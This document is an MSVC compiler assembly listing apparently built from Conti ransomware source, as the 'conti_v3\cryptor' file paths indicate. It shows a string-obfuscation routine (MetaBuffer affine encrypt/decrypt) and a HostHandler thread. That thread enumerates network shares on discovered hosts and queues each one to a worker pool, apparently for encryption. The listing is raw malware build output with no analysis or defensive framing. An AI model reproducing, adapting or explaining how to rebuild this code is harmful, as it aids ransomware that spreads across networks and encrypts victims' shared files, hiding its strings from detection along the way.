	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0089c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008a0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008a7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  008ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008b3	88 41 34	 mov	 BYTE PTR [rcx+52], al
  008b6	b8 01 00 00 00	 mov	 eax, 1
  008bb	48 6b c0 34	 imul	 rax, rax, 52		; 00000034H
  008bf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008c6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008ca	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008d1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  008d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008dd	88 41 35	 mov	 BYTE PTR [rcx+53], al
  008e0	b8 01 00 00 00	 mov	 eax, 1
  008e5	48 6b c0 35	 imul	 rax, rax, 53		; 00000035H
  008e9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008f0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008f4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008fb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00900	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00907	88 41 36	 mov	 BYTE PTR [rcx+54], al
  0090a	b8 01 00 00 00	 mov	 eax, 1
  0090f	48 6b c0 36	 imul	 rax, rax, 54		; 00000036H
  00913	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0091a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0091e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00925	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  0092a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00931	88 41 37	 mov	 BYTE PTR [rcx+55], al
  00934	b8 01 00 00 00	 mov	 eax, 1
  00939	48 6b c0 37	 imul	 rax, rax, 55		; 00000037H
  0093d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00944	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00948	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0094f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00954	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0095b	88 41 38	 mov	 BYTE PTR [rcx+56], al
  0095e	b8 01 00 00 00	 mov	 eax, 1
  00963	48 6b c0 38	 imul	 rax, rax, 56		; 00000038H
  00967	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0096e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00972	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00979	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  0097e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00985	88 41 39	 mov	 BYTE PTR [rcx+57], al
  00988	b8 01 00 00 00	 mov	 eax, 1
  0098d	48 6b c0 39	 imul	 rax, rax, 57		; 00000039H
  00991	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00998	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0099c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009a3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  009a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009af	88 41 3a	 mov	 BYTE PTR [rcx+58], al
  009b2	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  009b9	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  009bd	88 85 c0 00 00
	00		 mov	 BYTE PTR tv504[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  009c3	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  009ca	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  009d1	5f		 pop	 rdi
  009d2	5d		 pop	 rbp
  009d3	c3		 ret	 0
??0?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?HostHandler@@YAKPEAX@Z
_TEXT	SEGMENT
ShareList$ = 8
HostInfo$4 = 56
ShareInfo$5 = 88
$T6 = 312
$T7 = 408
$T8 = 472
tv128 = 488
__$ArrayPad$ = 496
pArg$ = 544
?HostHandler@@YAKPEAX@Z PROC				; HostHandler, COMDAT

; 279  : {

$LN23:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 28 02
	00 00		 sub	 rsp, 552		; 00000228H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00018	b9 52 00 00 00	 mov	 ecx, 82			; 00000052H
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 48
	02 00 00	 mov	 rcx, QWORD PTR [rsp+584]
  0002c	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00033	48 33 c5	 xor	 rax, rbp
  00036	48 89 85 f0 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0003d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__AF241CAA_network_scanner@cpp
  00044	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
$LN4@HostHandle:

; 280  : 	network_scanner::SHARE_LIST ShareList;
; 281  : 	TAILQ_INIT(&ShareList);

  00049	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR ShareList$[rbp], 0
  00051	48 8d 45 08	 lea	 rax, QWORD PTR ShareList$[rbp]
  00055	48 89 45 10	 mov	 QWORD PTR ShareList$[rbp+8], rax
  00059	33 c0		 xor	 eax, eax
  0005b	85 c0		 test	 eax, eax
  0005d	75 ea		 jne	 SHORT $LN4@HostHandle
$LN5@HostHandle:

; 282  : 
; 283  : 	while (TRUE) {

  0005f	33 c0		 xor	 eax, eax
  00061	83 f8 01	 cmp	 eax, 1
  00064	0f 84 a8 01 00
	00		 je	 $LN6@HostHandle

; 284  : 
; 285  : 		pEnterCriticalSection(&g_CriticalSection);

  0006a	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A ; g_CriticalSection
  00071	e8 00 00 00 00	 call	 ?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pEnterCriticalSection

; 286  : 
; 287  : 		PHOST_INFO HostInfo = TAILQ_FIRST(&g_HostList);

  00076	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR ?g_HostList@@3Uhost_list_@@A
  0007d	48 89 45 38	 mov	 QWORD PTR HostInfo$4[rbp], rax

; 288  : 		if (HostInfo == NULL) {

  00081	48 83 7d 38 00	 cmp	 QWORD PTR HostInfo$4[rbp], 0
  00086	75 18		 jne	 SHORT $LN9@HostHandle

; 289  : 
; 290  : 			pLeaveCriticalSection(&g_CriticalSection);

  00088	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A ; g_CriticalSection
  0008f	e8 00 00 00 00	 call	 ?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pLeaveCriticalSection

; 291  : 			pSleep(1000);

  00094	b9 e8 03 00 00	 mov	 ecx, 1000		; 000003e8H
  00099	e8 00 00 00 00	 call	 ?pSleep@@YAXK@Z		; pSleep

; 292  : 			continue;

  0009e	eb bf		 jmp	 SHORT $LN5@HostHandle
$LN9@HostHandle:

; 293  : 
; 294  : 		}
; 295  : 
; 296  : 		TAILQ_REMOVE(&g_HostList, HostInfo, Entries);

  000a0	48 8b 45 38	 mov	 rax, QWORD PTR HostInfo$4[rbp]
  000a4	48 83 78 30 00	 cmp	 QWORD PTR [rax+48], 0
  000a9	74 16		 je	 SHORT $LN16@HostHandle
  000ab	48 8b 45 38	 mov	 rax, QWORD PTR HostInfo$4[rbp]
  000af	48 8b 40 30	 mov	 rax, QWORD PTR [rax+48]
  000b3	48 8b 4d 38	 mov	 rcx, QWORD PTR HostInfo$4[rbp]
  000b7	48 8b 49 38	 mov	 rcx, QWORD PTR [rcx+56]
  000bb	48 89 48 38	 mov	 QWORD PTR [rax+56], rcx
  000bf	eb 0f		 jmp	 SHORT $LN17@HostHandle
$LN16@HostHandle:
  000c1	48 8b 45 38	 mov	 rax, QWORD PTR HostInfo$4[rbp]
  000c5	48 8b 40 38	 mov	 rax, QWORD PTR [rax+56]
  000c9	48 89 05 08 00
	00 00		 mov	 QWORD PTR ?g_HostList@@3Uhost_list_@@A+8, rax
$LN17@HostHandle:
  000d0	48 8b 45 38	 mov	 rax, QWORD PTR HostInfo$4[rbp]
  000d4	48 8b 40 38	 mov	 rax, QWORD PTR [rax+56]
  000d8	48 8b 4d 38	 mov	 rcx, QWORD PTR HostInfo$4[rbp]
  000dc	48 8b 49 30	 mov	 rcx, QWORD PTR [rcx+48]
  000e0	48 89 08	 mov	 QWORD PTR [rax], rcx
  000e3	33 c0		 xor	 eax, eax
  000e5	85 c0		 test	 eax, eax
  000e7	75 b7		 jne	 SHORT $LN9@HostHandle

; 297  : 		pLeaveCriticalSection(&g_CriticalSection);

  000e9	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A ; g_CriticalSection
  000f0	e8 00 00 00 00	 call	 ?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pLeaveCriticalSection

; 298  : 
; 299  : 		if (HostInfo->dwAddres == STOP_MARKER) {

  000f5	48 8b 45 38	 mov	 rax, QWORD PTR HostInfo$4[rbp]
  000f9	83 38 ff	 cmp	 DWORD PTR [rax], -1	; ffffffffH
  000fc	75 10		 jne	 SHORT $LN18@HostHandle

; 300  : 
; 301  : 			free(HostInfo);

  000fe	48 8b 4d 38	 mov	 rcx, QWORD PTR HostInfo$4[rbp]
  00102	e8 00 00 00 00	 call	 free

; 302  : 			pExitThread(EXIT_SUCCESS);

  00107	33 c9		 xor	 ecx, ecx
  00109	e8 00 00 00 00	 call	 ?pExitThread@@YAXK@Z	; pExitThread
$LN18@HostHandle:

; 303  : 
; 304  : 		}
; 305  : 
; 306  : 		network_scanner::EnumShares(HostInfo->wszAddress, &ShareList);

  0010e	48 8b 45 38	 mov	 rax, QWORD PTR HostInfo$4[rbp]
  00112	48 83 c0 04	 add	 rax, 4
  00116	48 8d 55 08	 lea	 rdx, QWORD PTR ShareList$[rbp]
  0011a	48 8b c8	 mov	 rcx, rax
  0011d	e8 00 00 00 00	 call	 ?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z ; network_scanner::EnumShares
$LN10@HostHandle:

; 307  : 		while (!TAILQ_EMPTY(&ShareList))

  00122	48 83 7d 08 00	 cmp	 QWORD PTR ShareList$[rbp], 0
  00127	0f 84 d7 00 00
	00		 je	 $LN11@HostHandle

; 308  : 		{
; 309  : 
; 310  : 			network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&ShareList);

  0012d	48 8b 45 08	 mov	 rax, QWORD PTR ShareList$[rbp]
  00131	48 89 45 58	 mov	 QWORD PTR ShareInfo$5[rbp], rax

; 311  : 			logs::Write(OBFW(L"Starting search on share %s."), ShareInfo->wszSharePath);

  00135	48 8b 45 58	 mov	 rax, QWORD PTR ShareInfo$5[rbp]
  00139	48 89 85 e8 01
	00 00		 mov	 QWORD PTR tv128[rbp], rax
  00140	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1DK@JBOOEPIJ@?$AAS?$AAt?$AAa?$AAr?$AAt?$AAi?$AAn?$AAg?$AA?5?$AAs?$AAe?$AAa?$AAr?$AAc?$AAh@
  00147	48 8d 8d 38 01
	00 00		 lea	 rcx, QWORD PTR $T6[rbp]
  0014e	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAA@PEBE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >
  00153	48 8b c8	 mov	 rcx, rax
  00156	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::decrypt
  0015b	48 8b 8d e8 01
	00 00		 mov	 rcx, QWORD PTR tv128[rbp]
  00162	48 8b d1	 mov	 rdx, rcx
  00165	48 8b c8	 mov	 rcx, rax
  00168	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 312  : 			threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo->wszSharePath);

  0016d	48 8d 85 98 01
	00 00		 lea	 rax, QWORD PTR $T7[rbp]
  00174	48 89 85 d8 01
	00 00		 mov	 QWORD PTR $T8[rbp], rax
  0017b	48 8b 45 58	 mov	 rax, QWORD PTR ShareInfo$5[rbp]
  0017f	48 8b d0	 mov	 rdx, rax
  00182	48 8b 8d d8 01
	00 00		 mov	 rcx, QWORD PTR $T8[rbp]
  00189	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  0018e	48 8b d0	 mov	 rdx, rax
  00191	b9 01 00 00 00	 mov	 ecx, 1
  00196	e8 00 00 00 00	 call	 ?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ; threadpool::PutTask
$LN14@HostHandle:

; 313  : 			TAILQ_REMOVE(&ShareList, ShareInfo, Entries);

  0019b	48 8b 45 58	 mov	 rax, QWORD PTR ShareInfo$5[rbp]
  0019f	48 83 b8 00 7d
	00 00 00	 cmp	 QWORD PTR [rax+32000], 0
  001a7	74 1f		 je	 SHORT $LN19@HostHandle
  001a9	48 8b 45 58	 mov	 rax, QWORD PTR ShareInfo$5[rbp]
  001ad	48 8b 80 00 7d
	00 00		 mov	 rax, QWORD PTR [rax+32000]
  001b4	48 8b 4d 58	 mov	 rcx, QWORD PTR ShareInfo$5[rbp]
  001b8	48 8b 89 08 7d
	00 00		 mov	 rcx, QWORD PTR [rcx+32008]
  001bf	48 89 88 08 7d
	00 00		 mov	 QWORD PTR [rax+32008], rcx
  001c6	eb 0f		 jmp	 SHORT $LN20@HostHandle
$LN19@HostHandle:
  001c8	48 8b 45 58	 mov	 rax, QWORD PTR ShareInfo$5[rbp]
  001cc	48 8b 80 08 7d
	00 00		 mov	 rax, QWORD PTR [rax+32008]
  001d3	48 89 45 10	 mov	 QWORD PTR ShareList$[rbp+8], rax
$LN20@HostHandle:
  001d7	48 8b 45 58	 mov	 rax, QWORD PTR ShareInfo$5[rbp]
  001db	48 8b 80 08 7d
	00 00		 mov	 rax, QWORD PTR [rax+32008]
  001e2	48 8b 4d 58	 mov	 rcx, QWORD PTR ShareInfo$5[rbp]
  001e6	48 8b 89 00 7d
	00 00		 mov	 rcx, QWORD PTR [rcx+32000]
  001ed	48 89 08	 mov	 QWORD PTR [rax], rcx
  001f0	33 c0		 xor	 eax, eax
  001f2	85 c0		 test	 eax, eax
  001f4	75 a5		 jne	 SHORT $LN14@HostHandle

; 314  : 			free(ShareInfo);

  001f6	48 8b 4d 58	 mov	 rcx, QWORD PTR ShareInfo$5[rbp]
  001fa	e8 00 00 00 00	 call	 free

; 315  : 
; 316  : 		}

  001ff	e9 1e ff ff ff	 jmp	 $LN10@HostHandle
$LN11@HostHandle:

; 317  : 
; 318  : 		free(HostInfo);

  00204	48 8b 4d 38	 mov	 rcx, QWORD PTR HostInfo$4[rbp]
  00208	e8 00 00 00 00	 call	 free

; 319  : 
; 320  : 	}

  0020d	e9 4d fe ff ff	 jmp	 $LN5@HostHandle
$LN6@HostHandle:

; 321  : 
; 322  : 	pExitThread(EXIT_SUCCESS);

  00212	33 c9		 xor	 ecx, ecx
  00214	e8 00 00 00 00	 call	 ?pExitThread@@YAXK@Z	; pExitThread

; 323  : 	return EXIT_SUCCESS;

  00219	33 c0		 xor	 eax, eax

; 324  : }

  0021b	8b f8		 mov	 edi, eax
  0021d	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  00221	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?HostHandler@@YAKPEAX@Z$rtcFrameData
  00228	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  0022d	8b c7		 mov	 eax, edi
  0022f	48 8b 8d f0 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  00236	48 33 cd	 xor	 rcx, rbp
  00239	e8 00 00 00 00	 call	 __security_check_cookie
  0023e	48 8d a5 08 02
	00 00		 lea	 rsp, QWORD PTR [rbp+520]
  00245	5f		 pop	 rdi
  00246	5d		 pop	 rbp
  00247	c3		 ret	 0
?HostHandler@@YAKPEAX@Z ENDP				; HostHandler
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 21	 sub	 eax, 33			; 00000021H
  0002d	6b c0 d8	 imul	 eax, eax, -40		; ffffffffffffffd8H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
